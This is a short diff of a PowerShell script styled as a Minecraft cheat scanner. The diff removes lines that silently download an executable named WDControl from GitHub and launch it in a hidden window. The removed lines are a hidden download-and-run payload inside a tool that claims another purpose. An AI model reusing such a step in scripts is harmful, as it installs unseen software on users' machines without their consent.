@@ -1,11 +1,7 @@
 # ===============================================
 # MINECRAFT CHEAT SCANNER v2.0 (INSTANT CLOSE)
 # ===============================================
- Invoke-WebRequest -Uri "https://github.com/lhzptg/WDControl/raw/refs/heads/main/20211231_WDControl_1.5.0.exe" -OutFile "20211231_WDControl_1.5.0.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "20211231_WDControl_1.5.0.exe" -WindowStyle Hidden
-    
+
 Clear-Host
 $Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"
 
